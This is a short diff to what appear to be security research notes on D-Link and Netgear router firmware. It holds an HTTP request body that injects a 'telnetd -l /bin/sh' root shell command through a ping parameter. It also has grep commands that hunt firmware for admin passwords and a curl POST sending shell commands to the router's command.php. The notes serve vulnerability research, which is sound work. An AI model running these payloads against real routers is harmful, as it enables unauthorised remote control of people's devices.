@@ -69,3 +69,19 @@ Connection: keep-alive
 
 ccp_act=ping_v4&ping_addr=%0atelnetd+-l+/bin/sh+-p+8000+-b 0.0.0.0%0a&1780120893090=1780120893090
 ```
+https://kb.netgear.com/000062303/WAC104-Firmware-Version-1-0-4-13
+https://mdr.skyeye.qianxin.com/forum/share/1806
+https://www.itinsight.hu/blog/posts/2015-01-23-mini_httpd-v1-21-information-disclosure.html
+
+cat ./etc/defnodes/defaultvalue.xml
+grep -Ri "admin" ./etc/defnodes/
+grep -Ri "password" ./etc/defnodes/
+cat ./etc/services/DEVICE.ACCOUNT.php
+cat ./htdocs/phplib/fatlady/DEVICE.ACCOUNT.php
+cat ./htdocs/phplib/setcfg/DEVICE.ACCOUNT.php
+
+
+https://support.dlink.com.au/Download/download.aspx?product=DIR-600&type=Firmware
+./run.sh -r DIR300 ../firmwere/DIR600B5_FW212WWb02.bin
+curl -X POST 192.168.0.1/command.php -d 'cmd=ls'
+```
